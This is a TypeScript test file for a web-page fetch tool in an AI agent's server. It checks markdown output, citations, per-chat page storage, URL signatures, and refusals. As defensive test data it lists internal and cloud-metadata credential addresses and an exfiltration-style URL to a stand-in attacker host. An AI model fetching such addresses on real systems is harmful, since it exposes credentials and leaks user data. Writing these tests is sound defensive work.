import { describe, it, beforeEach, afterEach } from "node:test";
import { expect } from "expect";
import { fn } from "jest-mock";
import { fetchWebpageHandler } from "../../../../../mcp-server/src/tools/backend/fetch-webpage.ts";
import { logicalUrl } from "../../../../helpers/logical-url.ts";
import { _resetPageStore, getPage } from "../../../../../mcp-server/src/lib/page-store.ts";
import { signScope, signUrl } from "../../../../../src/lib/scope.ts";

const realFetch = globalThis.fetch;
const CHAT = "u1:chat1";
const SECRET = "0123456789abcdef0123";
process.env.INES_SCOPE_SECRET = SECRET;
const scoped = (chat: string = CHAT) => ({
  "x-ines-conversation-id": chat,
  "x-ines-scope-sig": signScope(SECRET, chat),
});
const call = (url: string, chat: string = CHAT) => ({
  url,
  "x-ines-url-sig": signUrl(SECRET, url),
  ...scoped(chat),
});
const callWithoutChat = (url: string) => ({ url, "x-ines-url-sig": signUrl(SECRET, url) });

const page = (body: string, init: ResponseInit = {}) =>
  new Response(body, { ...init, headers: { "content-type": "text/html; charset=utf-8", ...init.headers } });

function mockFetch(impl: (url: string) => Response | Promise<Response>) {
  globalThis.fetch = fn((input: string | URL | Request, init?: RequestInit) => {
    const url = logicalUrl(input, init);
    return Promise.resolve(impl(url));
  }) as unknown as typeof fetch;
}

beforeEach(() => {
  globalThis.fetch = realFetch;
  _resetPageStore();
});

afterEach(() => {
  globalThis.fetch = realFetch;
});

describe("fetchWebpageHandler — happy path", () => {
  it("returns markdown text + a web citation when fetch succeeds", async () => {
    mockFetch(() =>
      page(
        "<html><head><title>Hello</title></head><body><h1>Heading</h1><p>Body</p><script>x()</script></body></html>",
        { status: 200 },
      ),
    );
    const res = await fetchWebpageHandler(call("https://example.com"));
    expect(res.content).toHaveLength(2);
    expect(res.content[0].text).toContain("Heading");
    expect(res.content[0].text).toContain("Body");
    expect(res.content[0].text).not.toContain("script");
    const cit = JSON.parse(res.content[1].text);
    expect(cit.$ines_kind).toBe("citation");
    expect(cit.citation.type).toBe("web");
    expect(cit.citation.url).toBe("https://example.com");
    expect(cit.citation.title).toBe("Hello");
  });

  it("decodes HTML entities in the title", async () => {
    mockFetch(() => page("<html><head><title>A &amp; B</title></head><body>x</body></html>"));
    const res = await fetchWebpageHandler(call("https://example.com"));
    const cit = JSON.parse(res.content[1].text);
    expect(cit.citation.title).toBe("A & B");
  });

  it("falls back title to hostname when none present", async () => {
    mockFetch(() => page("<html><body>plain</body></html>"));
    const res = await fetchWebpageHandler(call("https://example.com/page"));
    const cit = JSON.parse(res.content[1].text);
    expect(cit.citation.title).toBe("example.com");
  });

  it("returns an overview of a large page, not the page", async () => {
    const paragraphs = Array.from({ length: 300 }, (_, i) => `<p>Paragraph ${i} says something about the quarter.</p>`).join("");
    mockFetch(() => page(`<html><head><title>Big</title></head><body><h1>Report</h1>${paragraphs}</body></html>`));
    const res = await fetchWebpageHandler(call("https://example.com/big-report"));
    const text = res.content[0].text;
    expect(text.length).toBeLessThan(4500);
    expect(text).toContain("Title: Big");
    expect(text).toContain("- Report");
    expect(text).toContain("Paragraph 0 says");
    expect(text).not.toContain("Paragraph 299 says");
    expect(text).toMatch(/Readable text \(\d+ characters in all; the first \d+\)/);
    expect(text).toContain("inspect_webpage");
    expect(text).toMatch(/page_id: p-[0-9a-f]{8}/);
  });

  it("holds the page as it was fetched, for the chat that fetched it, under an id that is the same for the same address", async () => {
    const html = "<html><head><title>Held</title></head><body><p>content</p><a href='/x'>x</a></body></html>";
    mockFetch(() => page(html));
    const first = await fetchWebpageHandler(call("https://example.com/p"));
    const id = first.content[0].text.match(/page_id: (p-[0-9a-f]{8})/)?.[1] ?? "";
    expect(id).not.toBe("");
    expect(getPage("u1:chat1", id)).toMatchObject({ title: "Held", source: html, url: "https://example.com/p" });
    expect(getPage("u2:chat9", id)).toBeUndefined();

    const again = await fetchWebpageHandler(call("https://example.com/p"));
    expect(again.content[0].text).toContain(`page_id: ${id}`);
  });

  it("holds nothing, and says so, when there is no chat to hold it for", async () => {
    mockFetch(() => page("<html><body>" + "<p>word</p>".repeat(2000) + "</body></html>"));
    const res = await fetchWebpageHandler(callWithoutChat("https://example.com/p"));
    expect(res.content[0].text).not.toContain("page_id");
    expect(res.content[0].text).toContain("it is not held");
  });

  it("holds nothing for a call whose chat the agent did not sign", async () => {
    const saved = process.env.INES_SCOPE_SECRET;
    process.env.INES_SCOPE_SECRET = "0123456789abcdef0123";
    try {
      const { signUrl } = await import("../../../../../src/lib/scope.ts");
      mockFetch(() => page("<html><body><p>hi</p></body></html>"));
      const url = "https://example.com/p";
      const forged = await fetchWebpageHandler({ url, "x-ines-url-sig": signUrl("0123456789abcdef0123", url), "x-ines-conversation-id": "victim:chat", "x-ines-scope-sig": "forged" });
      expect(forged.content[0].text).not.toContain("page_id");
      expect(getPage("victim:chat", "p-00000000")).toBeUndefined();
      const signed = await fetchWebpageHandler({
        url,
        "x-ines-url-sig": signUrl("0123456789abcdef0123", url),
        ...scoped(),
        "x-ines-scope-sig": signScope("0123456789abcdef0123", "u1:chat1"),
      });
      expect(signed.content[0].text).toContain("page_id");
    } finally {
      if (saved === undefined) delete process.env.INES_SCOPE_SECRET;
      else process.env.INES_SCOPE_SECRET = saved;
    }
  });

  it("reads JSON and plain text as pages, and refuses what is not one", async () => {
    mockFetch(() => new Response('{"rows":[1,2],"total":2}', { headers: { "content-type": "application/json" } }));
    const json = await fetchWebpageHandler(call("https://example.com/data.json"));
    expect(json.content[0].text).toContain("Embedded JSON: [0] JSON (rows, total)");

    mockFetch(() => new Response("%PDF-1.7 ...", { headers: { "content-type": "application/pdf" } }));
    const pdf = await fetchWebpageHandler(call("https://example.com/a.pdf"));
    expect(pdf.content).toHaveLength(1);
    expect(pdf.content[0].text).toContain("application/pdf, which is not a web page");
  });
});

describe("fetchWebpageHandler — failure paths", () => {
  it("returns an explanatory text item on non-2xx response", async () => {
    mockFetch(() => new Response("not found", { status: 404, statusText: "Not Found" }));
    const res = await fetchWebpageHandler(call("https://example.com"));
    expect(res.content).toHaveLength(1);
    expect(res.content[0].text).toContain("Failed to fetch");
    expect(res.content[0].text).toContain("404");
  });

  it("returns an error item when fetch throws", async () => {
    globalThis.fetch = fn(() => Promise.reject(new Error("offline"))) as unknown as typeof fetch;
    const res = await fetchWebpageHandler(call("https://example.com"));
    expect(res.content).toHaveLength(1);
    expect(res.content[0].text).toContain("Failed to fetch");
    expect(res.content[0].text).toContain("offline");
  });
});

describe("fetchWebpageHandler — turndown isolation", () => {
  it("does not leak `.remove()` state across calls", async () => {
    mockFetch(() => page("<html><body><p>visible</p><script>secret</script></body></html>"));
    const a = await fetchWebpageHandler(call("https://x"));
    expect(a.content[0].text).not.toContain("secret");

    const b = await fetchWebpageHandler(call("https://x"));
    expect(b.content[0].text).not.toContain("secret");
  });
});

describe("fetchWebpageHandler — addresses inside the deployment", () => {
  it("does not fetch them: any user can call this tool with any address", async () => {
    let fetched = 0;
    mockFetch(() => {
      fetched++;
      return page("<title>secret</title>");
    });
    for (const url of [
      "http://api:8000/app/user",
      "http://mysql:3306/",
      "http://localhost:8000/health",
      "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
      "http://10.0.0.5/admin",
      "http://[::1]/",
    ]) {
      const res = await fetchWebpageHandler(call(url));
      expect(res.content).toHaveLength(1);
      expect(res.content[0].text).toContain("Refusing to fetch");
      expect(res.content[0].text).not.toContain("secret");
    }
    expect(fetched).toBe(0);
  });

  it("does not follow a redirect from a public page to one", async () => {
    mockFetch((url) =>
      url === "https://example.com/go"
        ? new Response(null, { status: 302, headers: { location: "http://169.254.169.254/latest/meta-data/" } })
        : page("<title>secret</title>"),
    );
    const res = await fetchWebpageHandler(call("https://example.com/go"));
    expect(res.content[0].text).toContain("Refusing to fetch");
  });
});

describe("fetchWebpageHandler — a page that is built to cause trouble", () => {
  it("is refused when it is larger than a page is", async () => {
    mockFetch(() => page(`<html><body>${"x".repeat(6 * 1024 * 1024)}</body></html>`, { status: 200 }));
    const res = await fetchWebpageHandler(call("https://example.com/big"));
    expect(res.content).toHaveLength(1);
    expect(res.content[0].text).toContain("Failed to fetch https://example.com/big");
    expect(res.content[0].text).toContain("larger than");
  });

  it("is answered, one way or the other, when it nests a hundred thousand levels deep, and the next page is read", { timeout: 40_000 }, async () => {
    const deep = `<html><body>${"<div>".repeat(100_000)}text${"</div>".repeat(100_000)}</body></html>`;
    mockFetch(() => page(deep, { status: 200 }));
    const started = Date.now();
    const res = await fetchWebpageHandler(call("https://example.com/deep"));
    expect(Date.now() - started).toBeLessThan(20_000);
    expect(res.content.length).toBeGreaterThan(0);

    mockFetch(() => page("<html><head><title>Ok</title></head><body><p>fine</p></body></html>", { status: 200 }));
    const next = await fetchWebpageHandler(call("https://example.com/ok"));
    expect(next.content[0].text).toContain("fine");
  });
});

describe("fetchWebpageHandler — addresses the agent did not sign", () => {
  const SECRET = "0123456789abcdef0123";
  const saved = { secret: process.env.INES_SCOPE_SECRET, any: process.env.INES_FETCH_ANY_URL };
  beforeEach(() => {
    process.env.INES_SCOPE_SECRET = SECRET;
    delete process.env.INES_FETCH_ANY_URL;
  });
  afterEach(() => {
    for (const [name, value] of [["INES_SCOPE_SECRET", saved.secret], ["INES_FETCH_ANY_URL", saved.any]] as const) {
      if (value === undefined) delete process.env[name];
      else process.env[name] = value;
    }
  });

  it("makes no request for an address without the signature, and does not say the address back", async () => {
    let requests = 0;
    mockFetch(() => {
      requests++;
      return page("<html><body>x</body></html>");
    });
    const attack = "https://attacker.example/collect?d=my-holdings";
    const res = await fetchWebpageHandler({ url: attack });
    expect(requests).toBe(0);
    expect(res.content).toHaveLength(1);
    expect(res.content[0].text).toContain("was not given in this conversation");
    expect(res.content[0].text).not.toContain("attacker");
    expect(res.content[0].text).not.toContain("my-holdings");
  });

  it("fetches an address that carries the agent's signature, and no other under it", async () => {
    const { signUrl } = await import("../../../../../src/lib/scope.ts");
    let requests = 0;
    mockFetch(() => {
      requests++;
      return page("<html><head><title>T</title></head><body>page</body></html>");
    });
    const signature = signUrl(SECRET, "https://example.com/report");
    const ok = await fetchWebpageHandler({ url: "https://example.com/report", "x-ines-url-sig": signature });
    expect(ok.content[0].text).toContain("page");
    expect(requests).toBe(1);
    const other = await fetchWebpageHandler({ url: "https://example.com/report?d=secret", "x-ines-url-sig": signature });
    expect(other.content[0].text).toContain("was not given");
    expect(requests).toBe(1);
  });

  it("fetches any address when the deployment says so", async () => {
    process.env.INES_FETCH_ANY_URL = "true";
    mockFetch(() => page("<html><body>open</body></html>"));
    const res = await fetchWebpageHandler(call("https://example.com/anything"));
    expect(res.content[0].text).toContain("open");
  });
});
